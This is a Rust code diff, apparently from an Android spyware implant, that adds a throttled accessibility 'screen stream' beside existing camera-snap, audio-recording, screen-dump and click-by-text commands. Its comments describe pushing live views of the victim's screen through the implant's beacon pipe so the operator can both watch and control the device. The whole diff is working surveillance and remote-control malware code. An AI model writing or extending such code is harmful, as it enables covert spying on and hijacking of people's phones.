@@ -165,6 +165,8 @@ fn proto_for(method: &str) -> String {
         "snapCamera" => "(Ljava/lang/String;)Ljava/lang/String;".into(),
         // ShadowBridge.recordAudio(ms: Int): String
         "recordAudio" => "(I)Ljava/lang/String;".into(),
+        // ShadowBridge.setScreenStream(on: Boolean, intervalMs: Int, maxNodes: Int): String
+        "setScreenStream" => "(ZII)Ljava/lang/String;".into(),
         _ => "()Ljava/lang/String;".into(),
     }
 }
@@ -175,6 +177,28 @@ fn proto_for(method: &str) -> String {
 
 pub fn a11y_dump_screen() -> String {
     call_bridge_string("dumpScreen", &[])
+}
+
+/// Toggle the throttled a11y "screen stream" (live semantic view).
+///
+/// While enabled the a11y service re-dumps the active window every
+/// `interval_ms` and pushes a compact, change-gated frame down the EXISTING
+/// event pipe (ShadowCore.logEvent -> push_event -> /t/recv -> DO
+/// implant_events) -- no new transport and no new dependencies.
+///
+/// This is deliberately NOT a screenshot. The beacon is a 25s long-poll and
+/// cannot carry pixels continuously; the node tree is what it can afford, and
+/// it is enough both to see the screen and to drive it (clickNodeById /
+/// clickByText). Pixel capture stays a separate on-demand command.
+pub fn set_screen_stream(on: bool, interval_ms: i32, max_nodes: i32) -> String {
+    call_bridge_string(
+        "setScreenStream",
+        &[
+            JValue::Bool(on as u8),
+            JValue::Int(interval_ms),
+            JValue::Int(max_nodes),
+        ],
+    )
 }
 
 pub fn a11y_click_text(needle: &str) -> String {
